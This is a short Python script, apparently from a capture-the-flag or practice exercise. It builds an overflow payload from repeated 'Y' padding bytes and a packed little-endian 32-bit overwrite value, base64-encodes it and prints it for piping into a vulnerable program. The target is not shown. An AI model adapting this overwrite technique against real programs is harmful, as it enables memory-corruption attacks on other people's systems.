
import sys
import struct
import base64

buf = b'YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY'
buf += struct.pack('<I', 2050189690)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
